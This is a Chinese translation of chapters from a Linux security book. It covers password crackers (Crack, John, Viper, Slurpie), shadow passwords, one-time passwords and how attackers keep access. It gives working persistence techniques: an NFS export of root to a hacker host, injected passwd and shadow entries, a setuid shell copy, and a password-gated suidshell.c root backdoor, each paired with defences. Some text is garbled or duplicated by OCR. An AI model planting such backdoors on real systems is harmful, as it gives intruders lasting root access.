该选项将把 `scripts/nastygram` 的内容发送给所有被 Crack 破解密码的用户。你可以修改此脚本，向密码较弱的用户发送消息，并利用它来告知和教育他们使用强密码的知识。

向那些弱密码被破解的用户发送邮件的原因是因为他们会将密码改为强密码。然而，也有不发送这封邮件的充分理由：它可能在传输过程中被黑客拦截，黑客会知道该用户的密码很弱。黑客随后可以尝试破解用户的密码、登录并自己更改密码，或者造成更糟糕的破坏。处理弱密码的更好方法可能是锁定用户并尝试联系他们，或者在方便的情况下等他们联系你。

### 查看结果

要查看 Crack 的结果，请使用提供的 `Reporter` 程序：

```bash
[root@machine1 c50a#] ./Reporter
```

```
--- passwords cracked as of Mon Sep 11 12:52:11 CDT 2000 ---
Guessed student [student] [passwd.txt /bin/bash]
Guessed jdoe [john] [passwd.txt /bin/bash]
Guessed root [IamGod] [passwd.txt /bin/bash]
```

在这里看到 Crack 破解了三个用户的密码。**注意**：root 用户的密码非常复杂。

| 关于 Crack 的重要说明 |
| :--- |
| 请务必查看 Crack 网站上的帮助文件。它有很多非常有用的提示和说明。有一个问题特别值得提到： |
| 如何在 DOS/95 下运行 Crack？ |
| 格式化你的硬盘并安装 Linux，然后重试。 |

## John the Ripper

| 程度 | 9 |
| :--- | :--- |
| 易用性 | 9 |
| 影响 | 9 |
| 风险评分 | 9 |

另一个密码破解程序是 John the Ripper。John 比 Crack 更快，并具有一些额外功能：

- 它设计得快速且强大。
- 它破解标准的长度 DES、MD5 和 Blowfish 算法。
- 它使用内部的高优化模块代替 `crypt (3)`。
- 你可以暂停和恢复会话。
- 它适用于不同的平台，因此在机器上启动的程序可以在其他机器上恢复。
- 你可以指定自己的单词列表和规则。
- 你可以获取中断或运行会话的状态。
- 你可以指定破解哪些用户或组。

### 安装 John the Ripper

访问官方网站：http://www.openwall.com/john/ 在这里可以获取最新版本。

要使用 John，你可以提取源码：

```bash
jdoe@machine$ tar xzf john-1.6.gz
```

现在，进入目录：

```bash
jdoe@machine$ cd john
```

破解密码：

```bash
jdoe@machine$ john -single /etc/passwd
```

### 运行 John

John 的模式可以通过其中的定义来增强。该文件包含了许多用户可以创建和增强的规则和模式。还有许多其他运行方式。

恢复中断的会话：

```bash
jdoe@machine run$ -restore
```

检索破解的密码：

```bash
jdoe@machine run -show -users passwd.txt
jdoe:john:500:500:John Doe:/home/john:/bin/bash
student:student:501:100::home/student:/bin/bash
```

## 其他破解程序

尽管 Crack 和 John the Ripper 是两个广为人知的密码破解工具，但还有大量的破解程序可用。访问这些程序长列表的一个极佳网站是 http://packetstorm.security.com/。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_329_0.png)

### Viper

| 流行度 | 6 |
| --- | --- |
| 简单性 | 10 |
| 影响 | 7 |
| 风险评分 | 7 |

Viper (http://www.wilter.com/wf/) 是一个基于 GUI 的 Windows 程序，用于对 DES/crypt (*) 密码进行暴力破解攻击。它将 `/etc/passwd` 或 `/etc/shadow` 中的一行（将在本章介绍）作为输入，并开始使用长度 1 到 12 个字符的密码进行暴力破解。Viper 将检查所有密码。它从字面上从“a”检查到“00000000000”以及其之间所有可能的组合。它检查字母和数字，并选择忽略标点符号和特殊字符。由于 Viper 正在检查字母和数字的所有可能组合，执行可能需要很长时间——非常长的时间。如果它检查长度为 12 的字符串中所有可能的字符组合，必须检查超过 3620 亿次。在快速机器上，这将花费相当的时间。

Viper 运行速度非常慢，在工作时会占用大量处理器。此外，尝试无限扩展窗口可能需要几分钟。然而，需要知道，如果你发现自己无法访问 Linux 机器，在其他平台上破解 Linux 密码是可能的（而发现自己无法访问 Linux 机器正是尝试破解一台的非常好的理由）。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_329_1.png)

### Slurpie

| 流行度 | 8 |
| --- | --- |
| 简单性 | 8 |
| 影响 | 9 |
| 风险评分 | 8 |

Slurpie (http://www.jsp.net/coati/archives/slurpie.html) 是一种类似于 Crack 和 John the Ripper 的密码破解程序，可以在分布式环境中运行。由于 Slurpie 可以同时在多台计算机上运行，这可以大大加快破解进度。

Slurpie 的输入是一个密码文件以及可选的字典。Slurpie 可以在单主机上运行，也可以在多个主机上运行。若要在多个主机上运行，只需在每台机器上构建 Slurpie，并将每台机器的 IP 添加到 Slurpie 分发包中的 `hostsdat` 文件中。

## 密码破解防御措施

你可以采取几种措施来保护你的机器免受黑客使用密码破解程序破解你的密码：

- 亲自运行破解程序以发现你机器上的弱密码。
- 确保密码文件不可读。
- 检查你的日志文件。
- 使用影子密码（本章稍后会讨论）。

## 字典的可用性

由于字典攻击使用单词列表来生成密码，单词列表越全面，攻击成功的可能性就越大（如果用户的密码基于字典中的单词）。因此，如果你正尝试破解密码，你应该获取一个或多个字典。记住也要使用多种语言的字典，以及带有相对冷僻词汇（如科学术语）的字典。以下是包含许多高质量字典的资源。

### Linux 字典

你可以在 Linux 机器上找到字典。在 RedHat 6.2 版本中，可以在 `/usr/dict/words` 找到。

### Packetstorm

该网站 (http://packetstorm.securify.com/) 拥有大量的字典和词表。你可以找到不同语言（例如中文、丹麦语和意大利语）以及不同主题（生物学、大学和姓氏）的词表。此外，该网站还有许多密码破解程序的链接。

### 德国柏林自由大学

这是另一个网站 (http://ftp.fu-berlin.de/pub/unix/security/dictionaries/)，包含许多字典，包括许多不同的语言。

## 影子密码与 /ETC/SHADOW

影子密码（Password shadowing）是一种隐藏加密密码的方法，从而使字典攻击变得困难。`/etc/passwd` 仍然存在，但会创建一个名为 `/etc/shadow` 的另一个文件。该文件包含系统中所有密码的加密版本，且仅供 root 读取。影子密码现在被认为是安全至关重要的，因此大多数 Linux 发行版都实现了影子密码。使用影子密码至关重要；隐藏加密

## 破解 Linux 暴露：Linux 安全与解决方案

本章此部分将描述影子密码并演示如何将未加密密码转换为影子密码。如果使用了影子密码，`/etc/passwd` 的内容将类似于：

```
root:x:0:0:/root/
bin:x:1::/bin/
daemon:x:2::/sbin/
adm:x:3:4:/var/adm/
lp:x:4:7:/var/spool/lp/
mail:x:8:12:/var/spool/mail/
news:x:9:13:/var/spool/news/
uucp:x:10:14:/var/spool/uucp/
operator:x:11:0:/root/
gopher:x:13:30:/usr/lib/gopher/
ftp:x:14:50:/home/ftp
body:x:99:99::
xfs:x:100:1:/etc/nfs/false
gdm:x:42:42::/home/gdm/bash
postgres:x:40:233:/var/lib/postgresql
```



`jde:x:500:500:/home/jdoe/bash`

`student:x:501:100::/home/student/bash`

```
注意加密字段现在是 "x"（这不是加密内容）。`/etc/shadow` 的内容如下：
```

```
root:aeGvvg:1013:0:99999:7:-134594

bin*:10012:0:99999:7::

daemon*:10012:0:99999:7::

adm*:10012:0:99999:7::

lp*:10012:0:99999:7::

mail*:10012:0:99999:7::

news*:10012:0:99999:7::

uucp*:10012:0:99999:7::

operator*:10012:0:99999:7::

gopher*:10012:0:99999:7::

ftp*:10012:0:99999:7::

body*:10012:0:99999:7::

xfs*:10012:0:99999:7::

gdm*:10012:0:99999:7::

postgres*:10012:0:99999:7::

jeoe*b1195:0:99999:7:-134592

student*32:1195:0:99999:7:-134592
```

`/etc/shadow` 中的字段代表：

- 用户名
- 加密密码
- 自 1970 年 1 月 1 日以来更改密码的天数
- 用户允许更改密码的剩余天数
- 用户必须更改密码的剩余天数
- 在必须更改密码前提前警告的天数
- 用户更改密码或账户将被禁用的剩余天数
- 预留字段

显示 `/etc/shadow` 文件仅供 root 读取的：

```
[jdoe@machine jdoe]$ ls -1 /etc/passwd /etc/shadow

-rw-r--r-- root 842 Sep 12 16:24 /etc/passwd

-r-------- root 759 Sep 12 16:24 /etc/shadow
```

你可以看到 `/etc/shadow` 不仅隐藏了加密密码使字典攻击变得非常困难，还包含了维护密码的信息。

在当今敌对的网络环境中，影子密码是至关重要的，大多数 Linux 发行版都支持影子。如果你现在的 Linux 机器没有实现影子，你应该现在转换为影子。

# 启用影子密码

启用影子密码只需要运行 Linux 机器上已安装的几个系统程序。以下步骤说明了如何将未实现影子密码的机器转换为实现的。

## pwck–检查 /etc/passwd 的完整性

首先，运行 `pwck` 验证 `/etc/passwd` 的完整性。`/etc/passwd` 中的每个条目都会被检查是否符合格式并具有有效数据。`pwck` 程序验证：

- 正确的字段数量
- 唯一的用户名
- 有效的用户和组标识符

```
[root@machine1]# pwck

user adm: directory /var/adm does not exist

user gopher: directory /usr/lib/gopher-data does not exist

user gdm: directory /home/gdm does not exist

pwick: no changes
```

## pwconv—转换为影子密码

接下来，运行 `pwconv` 转换为影子密码。它从现有的 `/etc/passwd` 文件和可选的影子文件（合并两个文件）创建 `/etc/shadow` 文件。

```
[root@machine1]# pwconv
```

恭喜。你现在有了影子密码，并在提高 Linux 密码安全性方面迈出了一步。

> 你应该通过检查 `/etc/passwd` 内容来验证转换为影子密码是否成功，查看所有加密密码是否已替换为 "x"。此外，在转换为影子密码后，仍然向 `/etc/passwd` 添加普通的未影子化账户。因此，定期检查 `/etc/passwd` 的内容以确保所有密码都是影子化的。

# 影子密码命令套

使用影子密码还提供了一组维护你密码的工具。

## change 命令

影子命令套件中最重要的命令是 `chage`。该命令更改系统用于确定用户何时必须更改密码的信息。要强制用户在特定时间段后更改密码，使用 `-M` 选项。

```
chage [-m mindays] [-M maxdays] [-d lastday] [-I inactive]

[-E expiredate] [-W warundays] user
```

### 第 8 章：密码破解

- `mindays`: 密码更改之间的最小天数
- `maxdays`: 密码有效的最大天数
- `lastday`: 自 1970 年 1 月 1 日以来最后一次更改密码的天数
- `inactive`: 密码过期后账户被禁用之前的未活动天数
- `expiredate`: 用户账户被禁用的日期
- `wardays`: 更改密码前的警告天数

### 其他有用的 shadow 命令

`shadow` 工具套件中还有许多其他命令。以下是一些最常用命令的摘要。更多信息请参阅帮助条页（`man pages`）。

- `gpasswd`: 将新用户添加到组。
- `groupadd`: 创建新组。
- `groupdel`: 删除组。
- `groupmod`: 修改组信息。
- `passwd`: 替换 `/etc/passwd` `passwd` 程序以与 `/etc/shadow` 配合工作。
- `useradd`: 添加新用户。
- `userdel`: 删除用户。
- `usermod`: 修改用户信息。

## APACHE 密码文件

使用 Apache Web 服务器，可以通过 http 认证对文档的部分内容进行密码保护（第 12 章将进一步讨论）。认证要求用户以类似于登录 Linux 机器的方式登录网站——他们需要用户名和密码。这些用户名/密码值通常存储在系统上的文件中。该文件必须允许处理 http 请求的用户（通常是名为 `nobody` 的用户）读取。

> Apache 还可以使用来自外部数据库（如 Oracle 或 LDAP）的密码。

文件的每一行都是一条记录，用户名和该用户的加密密码用冒号分隔。这些 Apache 密码文件可能使用与 `/etc/passwd` 相同的加密方式——DES 或 MD5。

### 破解 Linux 安全：Linux 安全秘密与解决方案

这是一个使用 DES 的 Apache 认证密码文件示例：

```
al=:foTYdf.SNVq6

george:280VqwbMRgog

tom:wNvNFEBEAZFXw

njerry:ultdPMrqky99a
```

以下是使用 MD5 的示例：

```
al:$apr1RazPw/..$GChwLLC7z09Na2IUYVpl

george:$apr1SNBr./..Cyon73WDFMMyLObrr1cH/

tom:$apr1S45S1/..$DwxjsADAC065Ne3Ilhvbi

jerry:$apr182UFC..$j95167uas.Dp2w.HZA/z/
```



这些文件是使用 Apache 自带的 `passwd` 命令创建的。详情请执行 `htpasswd --help`。

许多希望对网页部分进行密码保护的管理员会编写简单的脚本，从 `/etc/shadow` 中提取密码信息。这非常方便，因为用户只需要记住一个密码。这不是一个好主意，因为 HTTP 认证是以明文通过网络传输的。即使你采取了措施使登录安全（例如用 `ssh` 替换 `telnet`），这些 HTTP 流量也会让密码处于危险之中。

访问第 6 章，有关通过连接 POP、IMAP 等服务尝试从网络获取密码的信息。

与 `/etc/shadow` 不同，这些文件（如 `/passwd`）大多数用户都可以读取，因此可以使用 `Crack` 或 `John` 等密码破解工具进行破解。

许多 Linux 应用都受密码保护，大多数它们都有自己的存储和处理密码的方法。示例包括 `Samba`（一种为 SMB/CIFS 客户端提供无缝文件和打印服务的开源软件——http://www.samba.org/）和 `MySQL`（一个开源免费的 MySQL 数据库系统——http://www.mysql.com/）。

## 可插认证模块 (PAM)

多年来，`/etc/passwd` 和 `/etc/shadow` 的用法已满足 Linux 社区大部分的需求，但它们有某些局限性。如果你希望启用新的密码方案，有两种可能：

- 管理员必须重新编译所有使用这种新认证方法的程序，以便它们知道如何原生地使用它，或者
- 管理员必须用额外的登录方法来“封装”服务。以登录为例，可以将用户的 `shell` 替换为伪 `shell`，该 `shell` 在将用户切换到实际登录 `shell` 之前执行第二次认证步骤。

## 第 9 章：密码破解

遗憾的是，这些方法并不干净。（注：原文中此处存在大量重复的 OCR 错误，已根据逻辑流处理）。

# 破解 Linux 揭秘：Linux 安全秘诀与解决方案

这是一个很好的密码，但缺少了一个数字；所以给它加上一个数字：

`Wu!T2d.`

使用这种方法可以创建的优秀密码数量基本上是无尽的。想象一下，怀怀地记得你过去喜过的书籍、电影和歌曲，并从一句难忘的话中创造出巧妙的缩写，是多么很有趣！

如果你担心别人可能知道你是一个古罗马学者或优良科幻电影的粉丝，因此他们可能会猜到你选择的句子，那么就想一个原始、独特的短语，并根据它创建一个缩写。

例如，编写以下句子：

`Monopoly and Sorry: two games to play.`（大富翁和道歉：两个玩的游戏。）产生了一个很好的密码：

`M&S:2g2p`

> 注意：由于这些密码示例已在书中发布，它们可能会出现在破解字典中。不要使用它们。

创建防弹密码：要创建一个几乎无法猜的密码，请使用 `DES` 使用最多 8 个随机字符，或使用 `MD5` 使用 15 个或更多随机字符。注意，你应该选择不同的密码长度。否则，黑客就会去猜测特定长度的密码（如 6 或 15）。以下是一些示例：

| DES | 示例 |
| :--- | :--- |
| DES | xAS?d458[5;OI!] |
| MD5 | ^p*LJAXnXnN*>803GZX3JA*DFU+/p3|zm"/vJ |

上述密码是用以下 Perl 程序生成的。你可以自由创建符合良好密码基本规则的随机字符串。该程序会提示你输入密码所需的长度，如果大小小于六个字符会报错。然后它会生成指定数量的随机字符，循环直到生成一个包含至少一个小写字母、一个大写字母、一个数字和一个标点符号的密码。

```perl
#!/usr/bin/perl -w

# password_generator.pl
```

```perl
use strict;

my @chars = (33..91,93..126);

my $num_chars = @chars;

my $length = ();

my $funny = '!"#\%&\'()*+,-\./:;<=>@[\\^_`{\|}-~';

print "Enter number of characters in your password: ";

chomp($length = <STDIN>);

die "Length must be greater than 6!" if $length <= 5;

while (1) {
  $password = '';
  foreach (1..$length) {
    $password .= chr($chars[int(rand($num_chars))]);
  }
  if ($password =~ /[a-z]/ and $password =~ /[A-Z]/ and
      $password =~ /[0-9]/ and $password =~ /[$funny]/) {
    print "password, \n";
    exit;
  }
}
```

这些极难猜解的密码有一个巨大的缺点：它们几乎无法记住。而且由于它们很难记忆，把它们写下来的诱惑力很大，而你永远不应该这样做。

## 在不同的系统上使用不同的密码

不要在不同的机器上使用相同的密码。如果你这样做，并且其中一个密码被破解，那么所有机器都会被破解。

然而，在所有不同的机器上使用独特且强力的密码会让它们变得困难。处理这个问题的一种策略是创建一个密码文件，并使用 `PGP` 和你可以记住的强密码句对其进行加密。然后，当你需要密码时，你可以使用该 `PGP` 加密文件登录机器并安全地查找——当然，前提是你到该计算机的连接是加密的。

`PGP`（优美隐私）是一套用于加密、解密和验证文本的工具包。（参见 http://www.pgp.com/）

另一个选项是为你的所有不同机器选择唯一的强密码，由于这很困难……（此处原文逻辑略有跳跃，根据上下文意为：使用 PGP 管理密码更优）。

（注：原文该段处逻辑略显杂乱，此处已按意译）



# 破解 Linux 揭秘：Linux 安全秘诀与解决方案

这是一个很好的密码，但缺少了一个数字；所以给它加上一个数字：

`Wu!T2d.`

使用这种方法可以创建的优秀密码数量基本上是无尽的。想象一下，怀怀地记得你过去喜过的书籍、电影和歌曲，并从一句难忘的话中创造出巧妙的缩写，是多么很有趣！

如果你担心别人可能知道你是一个古罗马学者或优良科幻电影的粉丝，因此他们可能会猜到你选择的句子，那么就想一个原始、独特的短语，并根据它创建一个缩写。

例如，编写以下句子：

`Monopoly and Sorry: two games to play.`（大富翁和道歉：两个玩的游戏。）产生了一个很好的密码：

`M&S:2g2p`

> 注意：由于这些密码示例已在书中发布，它们可能会出现在破解字典中。不要使用它们。

创建防弹密码：要创建一个几乎无法猜的密码，请使用 `DES` 使用最多 8 个随机字符，或使用 `MD5` 使用 15 个或更多随机字符。注意，你应该选择不同的密码长度。否则，黑客就会去猜测特定长度的密码（如 6 或 15）。以下是一些示例：

| DES | 示例 |
| :--- | :--- |
| DES | `xAS?d458[5;OI!]` |
| MD5 | `^p*LJAXnXnN*>803GZX3JA*DFU+/p3|zm"/vJ` |

上述密码是用以下 Perl 程序生成的。你可以自由创建符合良好密码基本规则的随机字符串。该程序会提示你输入密码所需的长度，如果大小小于六个字符会报错。然后它会生成指定数量的随机字符，循环直到生成一个包含至少一个小写字母、一个大写字母、一个数字和一个标点符号的密码。

```perl
#!/usr/bin/perl -w

# password_generator.pl
```

```perl
use strict;

my @chars = (33..91,93..126);

my $num_chars = @chars;

my $length = ();

my $funny = '!"#\%&\'()*+,-\./:;<=>@[\\^_`{\|}-~';

print "Enter number of characters in your password: ";

chomp($length = <STDIN>);

die "Length must be greater than 6!" if $length <= 5;

while (1) {

  $password = '';

  foreach (1..$length) {

    $password .= chr($chars[int(rand($num_chars))]);

  }

  if ($password =~ /[a-z]/ and $password =~ /[A-Z]/ and

      $password =~ /[0-9]/ and $password =~ /[$funny]/) {

    print "password, \n";

    exit;

  }

}
```

这些极难猜解的密码有一个巨大的缺点：它们几乎无法记住。而且由于它们很难记忆，把它们写下来的诱惑力很大，而你永远不应该这样做。

## 在不同的系统上使用不同的密码

不要在不同的机器上使用相同的密码。如果你这样做，并且其中一个密码被破解，那么所有机器都会被破解。

然而，在所有不同的机器上使用独特且强力的密码会让它们变得困难。处理这个问题的一种策略是创建一个密码文件，并使用 `PGP` 和你可以记住的强密码对其进行加密。然后，当你需要密码时，你可以使用该 `PGP` 加密文件登录机器并安全地查找——当然，前提是你到该计算机的连接是加密的。

`PGP`（优美隐私）是一套用于加密、解密和验证文本的工具包。（参见 `http://www.pgp.com/`）

另一个选项是为你的所有不同机器选择唯一的强密码，由于这很困难……

# 第 9 章：密码破解

# 破解 Linux 揭秘：Linux 安全机密与解决方案

这会强制用户的密码在 90 天后失效。当用户登录且密码过期时，用户必须在登录前输入一个新密码。

即使没有实施密码过期策略，鼓励用户每三个月更改一次密码也是一个好主意。常见的策略是在节气时更改密码，节气大约每三个月出现在 3 月 21 日、9 月 21 日和 12 月 21 日左右。

密码过期也有负面影响：如果用户必须频繁更改密码，他们可能会想把密码写下来，从而损害安全性。

## 一次性密码

一次性密码（`OTPs`）是一种系统策略，用户将使用一个不会再次使用的密码进行登录。这确保了如果密码在传输过程中被黑客拦截，对黑客来说也没有用，因为密码仅对一次登录会话有效。实现这种策略有多种方法。

- **SecureID**：这种 `OTP` 实现要求用户携带一个信用卡大小的电子设备，该设备显示一个在特定秒数内有效的代码。当用户想要登录时，他提供其用户名和 `SecureID` 卡上显示的代码。卡上显示的数值由中央系统生成并传输，系统使用该代码来验证用户。这种方法的优点是安全——黑客必须拦截从 `SecureID` 系统到 `SecureID` 卡的传输。这种方法的缺点是昂贵——每张卡片的成本约为 50 美元，如果组织为每个员工购买一张，费用将迅速增加。

- **S/Key**：这种 `OTP` 提供密码认证，并在服务器上实现。密码无法重用，因此任何在传输过程中拦截的密码对黑客来说都没有意义。该系统使用数学函数生成一次性密码列表。它使用存储的密钥对该字符串进行加密，并与存储的第 n 个密码进行匹配。如果它们相同，则用你提供的密码替换第 n 个密码。只要你知道与密钥关联的口令，你就可以生成服务器要求的任何 n 个密码之一。然而，黑客应该嗅探密码，因为一旦你使用了一个密码，所需的密码密码就变了。你通过线路提供的实际密码由 3-4 个字母的单词组成，以便输入。

- **OPIE**：代表无处皆的一次性密码（`One-Time Passwords in Everything`）。它是基于 `S/Key` 的库，并且向后兼容。发行版包含一个修改过的 `ftp` 守护进程，使其支持 `OPIE`。默认使用更强的 `MD5`，尽管它支持 `S/Key` 使用的 `MD4`。它的安装和与现有软件集成要简单得多。你可以在 `http://www.inner.net/opie/` 找到 `OPIE`

## 使用 MD5

`MD5` 允许用户拥有任意长度的密码，而 `DES` 的密码长度为八字符。更长的密码意味着更高的安全性（假设密码强度）。此外，`MD5` 的命名空间比 `DES` 大，这也增加了安全性。因此，如果可能，请使用 `MD5` 代替 `DES`。

## 运行密码破解器

系统管理员应该担心攻击者在他们的系统上运行密码破解器。然而，这并不意味着这些密码破解工具都是坏的。系统管理员可以在机器上运行这些工具并尝试破解其中的密码，从而确定系统上哪些密码是弱密码并应该更改。建议定期运行这些工具。

曾出现过一些系统管理员（特别是承包商）在客户机器上运行 `Crack` 或或其他密码破解程序的案例，客户认为承包商正试图为了某种邪恶目的破解密码，但实际上这是工作的一部分。所以，如果你认为作为工作的一部分在客户机器上破解密码是一个好主意，请先获得书面许可！

## 总结

密码安全至关重要——没有它，你的机器将永远是不安全的。我们讨论了你可以采取哪些措施来防止黑客尝试密码攻击。总结来说，这些步骤是：

- 实施影子密码（`shadow passwords`）。
- 使用 `MD5` 代替 `DES`。
- 通过实施良好的密码策略（包括在用户创建新密码时测试密码的工具）来强制用户创建强密码。
- 定期运行密码破解程序，尝试发现系统上的弱密码。
- 考虑使用密码过期和一次性密码。
- 永远不要将密码给给你信任的人。

## 不安全的 NFS 导出

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 8 |
| 影响 | 8 |
| 风险评分 | 7 |

维持对机器访问权限的一种优雅方法是让其文件系统，或者更糟，将 `"/"` 本身导出到黑客的机器上。这将使黑客能够在无需登录的情况下修改你机器上的所有文件：



`hackermachine# echo '/hackerbox(rw,no_root_squash)' >> /etc/exports`

```
```

`hackerbox# finger grant@hackedmachine.example.com`

`grant: no such user.`

`hackerbox# mount hackedmachine.example.com /mnt/hacked`

`hackerbox# cd /mnt/hacked/etc/`

`hackerbox# wc -1 passwd shadow`

```
```

`22 /passwd`

`hackerbox# cat new_pw_entry >> passwd`

`hackerbox# cat new_sh_entry >> shadow`

`hackerbox# mkdir /mnt/hacked/home/grant; chown grant /mnt/hacked/home/grant`

`hackerbox# wc -1 passwd shadow`

`23 /etc/passwd`

`23 /etc/shadow`

`44 total`

```
```

`hackerbox# finger grant@hackedmachine.example.com`

`Login: grant Name: Grant D. T.`

`Directory: /home/grant Shell: /bin/bash`

`Never logged in.`

`No mail.`

`No Plan.`

在上面的示例中，黑客简单地将受攻击机器的根分区挂载到自己的机器上（位于`/mnt/hacked`），并向`passwd`和`shadow`文件中添加了一个"`grant`"条目。

## 第 10 章：黑客如何维持访问权限

### NFS 导出防御措施

这种攻击手段非常原始。它依赖于管理员没有注意到他正在以 root 读/写方式导出文件系统。它还给攻击者留下了明显的痕迹。攻击者的机器名称，或者至少是他他使用的某台机器，被硬编码在受攻击机器的`/etc/exports`文件中。

如果机器已经在运行 NFS，管理员很可能会在日常管理和维护过程中查看查看`/etc/exports`，并可能在那时发现新条目。如果机器尚未运行 NFS，可以通过明显的`ps`或`rpcinfo`命令获取服务器：

```
hackedmachine$ ps -ef | grep $interesting_processes
bin 22173 1 04:20 ? 00:00 portmap
root 22875 1 04:52 ? 00:00 rpc.quotad
root 225 1 04:43 ? 00:00 rpc.mountd --no-nfs-version 3
root 917 1 04:43 ? 00:00 [nfs]
root 1013 1 04:43 ? 00:00 [nfs]
root 1206 1 04:43 ? 00:00 [nfs]
root 41900 1 04:43 ? 00:00 [lockd]
root 14681 1 04:43 ? 00:00 [rpcciod]
```

```
hackedmachine$ rpcinfo -p localhost
program vers proto port
100000 2 tcp 111 portmapper
100000 2 udp 111 portmapper
100011 1 udp 996 rquotad
100011 2 udp 996 rquotad
100005 1 udp 1004 mountd
100005 1 tcp 1006 mountd
100005 2 udp 1009 mountd
100005 2 tcp 1011 mountd
100003 2 udp 2049 nfs
100021 1 udp 1059 nlockcmgr
100021 3 udp 1059 nlockcmgr
100024 1 udp 621 status
100024 1 tcp 623 status
```

捕获此类变化最简单的方法是使用文件完整性工具监控所有重要的目录和文件，在这种情况下是`/etc/exports`以及`/etc/rc.d`目录结构（包含控制服务启动和停止的脚本）。在某些 Linux 版本中，可能涉及额外的文件，例如 SuSE 上的`/etc/rc.config`。这些大部分已经在`/etc`目录中，你应该像鹰隼一样紧盯着它们。

### 创建和修改账户

| 流行度 | 8 |
| :--- | :--- |
| 简单性 | 9 |
| 影响 | 7 |
| 风险评分 | 8 |

如果黑客是外部人员，他可能希望为自己创建一个新账户以便登录。如果他是一个授权的本地用户，但成功获得了 root 权限，他可能想为自己添加一个新账户，这样他就不会被怀疑是入侵者。

```
hackedme# echo mail:8:12:mail:/var/spool/mail:/bin/bash \
>> /etc/passwd
hackedme# echo mail:8:12:mail:/var/spool/mail:/bin/bash >> /etc/shadow
```

这段代码创建一个与 mail 用户、组和主目录相同的新用户，名称相似，希望管理员会认为它是合法的。通过使用与 mail 相同的用户组 ID，黑客可能也会获得有用的权限。由于 mail 用户可能有更改配置和读取所有用户（包括 root）的能力，黑客可能看到管理员是否在讨论入侵事件。黑客可能会给他的用户账户额外权限，将其放入特权组。与其使用普通账户，黑客可以创建一个 uid 为 0 用户并为自己创建一个 root 账户。这通常使用 root 这样的用户名完成。取决于机器配置，可能无法直接登录，所以这并没有那么糟糕。然而，配合普通用户账户，黑客可以轻松使用这个第二个 root 账户。另一个简单的技巧是给非零账户（例如 ftp、gdm 或 nobody）密码；除非管理员查看 shadow 文件，否则他可能意识到该账户可以被使用。

#### 防御措施

可能监控的文件有`/etc/passwd`、`/etc/shadow`和`/etc/group`。这些文件中的任何变化都意味着异常。`/etc/shadow`在用户更改密码时会被修改，因此这种变化是可以预期的。然而，如果一个非零账户有了密码，请警惕。

## 第 10 章：黑客如何维持访问权限

一种解决方案是使用控制`/etc/shadow`文件的脚本封装`passwd`程序，这样你就可以查看该文件的历史更改。访问我们的网页`hackingexposed.com`。

某些 Linux 发行版为守护账户提供了有效的 shell。例如，mail 的密码项可能是：

```
mail:x:8:12:mail:/var/spool/mail:
```

由于没有列出 shell，假设是`/bin/sh`。你应该将密码文件中所有的 shell 替换为不存在的 shell（如`/dev/null`），以确保这些账户不会被破解。

![](img/3382ff1435b4ef56cd22eccd_352_0.png)

账户可能比系统自身的 own多。例如，你可能有受`.htaccess`控制的受密码保护的网页。你可能有一个使用受限`passwd`文件的 FTP 区域。你可能有一个可以添加新账户的 MySQL 数据库。你应该对所有具有认证功能的系统进行枚举，并像对待 Linux 账户一样对它们进行审计。

### Setuid Shell

| 流行度 | 7 |
| :--- | :--- |
| 简单性 | 7 |
| 影响 | 8 |
| 风险评分 | 7 |

用户在没有任何密码或审计轨迹的情况下成为 root 的简单方法之一是拥有 setuid root 二进制文件。通过运行此程序，用户在程序运行期间获得了“有效用户 ID” root 权限。在示例中，涉及的程序是 bourne shell 的副本：

```
# 首先黑客创建 root shell
hackedmachine# cp /bin/sh /tmp
hackedmachine# chmod 4555 /tmp/sh
```

```
# 然后黑客用普通用户账户测试
hackedmachine$ id
uid=500 (reengen) gid=500 (reengen) groups=500 (reengen)
hackedmachine$ wc -1 /etc/shadow
wc: /etc/shadow: Permission denied
hackedmachine$ /tmp/sh
bash# id
uid=500 (reggen) gid=500 (reggen) uid=0 (root) groups=500 (reggen)
bash# wc -1 /etc/shadow
32 /etc/shadow
```



# 破解 Linux 暴露：Linux 安全秘密与解决方案

你看到通过简单地运行 setuid shell，黑客获得了 root 级别的访问，正如 `id` 输出以及 `/etc/shadow` 现在可读的事实所示。

你可以应用到 `bash` 源码的补丁，当它发现其真实用户 ID (`uid`) 和有效用户 ID (`eid`) 不相同时，会导致它退出（或放弃 root 权限）（一个示例可用 Bugtrap 存档：http://www.securityfocus.com/templates/archive.pike?list=1&mid=9435.）。这可以防御某些脚本小子的利用，但一旦机器被攻破，它就没有任何帮助。

与其留下 `/bin/sh` 的 setuid 代码，黑客可以很容易地编译（或上传）以下 C 程序：

```
* suidshell.c

* 使用以下编译

* gcc -o suidshell suidshell.c -lcrypt

*/
#include <stdio.h>
#include <unistd.h>
#define XOPEN_SOURCE
int main() {
    char password[BUFSSIZ];
    char encrypted[] = "00frf5pj6212";
    /* 让我们要求大家提供密码，
     * 只是为了让系统上的任何其他用户不能
     * 使用这个 shell。黑客在受攻击系统上
     * 最后需要的是另一个黑客
     * 搞砸事情。不，我们不提示它——
     * 那一定会引起管理员注意……
     */
    system("/bin/stty -echo");
    read(0, password, BUFSSIZ-1);
    system("/bin/stty -echo");
    if (strcmp(crypt(password, encrypted)) == 0) {
        setuid(0,0); /* 让真实和有效用户都变为 root */
        system("/bin/bash");
    } else {
        sleep(200); /* 让看起来像我们在做什么... */
    }
}
```

# 第 10 章：黑客如何维持访问

（用户输入密码 `root@m3.`）
```bash
[root@hackedmachine]# id -
uid=0(root) gid=500(reegen) groups=500(reegen)
```

该程序将静默等待密码，如果密码正确，它会将有效用户 ID 设置为 root。如果用户使用了错误的密码，它将运行 `sleep()` 命令，使其看起来像是在执行某些操作，这样其真实目的可能不会很快被发现。

如果你发现了一个 setuid 程序——或者说，任何未知程序——直接运行它并不是确定其功能的方法。如果它是一个木洛马，你只是在帮它的忙。如果该程序被设置为在提供密码后删除重要文件呢？确定其用途的方法是在调试器下运行它，或者至少使用 `strace` 观察它的行为，并且只有在你已经移除了 setuid 二进制文件，并以新创建的用户身份运行它时才这样做，且该系统是你即使程序造成损害也不介意丢失的。

上述显示的 `suidshell` 程序可以作为新程序安装在 `/sbin` 中，例如使用某个非二进制名称。黑客可能会替换一个现有的 setuid root 二进制文件（例如 `/usr/bin/lprm`），以希望你不会注意到。

## Setuserid Shell 应对措施

文件完整性检查器应该检查所有 setuid 二进制文件，以确定它们是否发生了变化。此外，确保定期运行程序以检查是否有新的 setuid 二进制文件。示例请参见第 2 章。

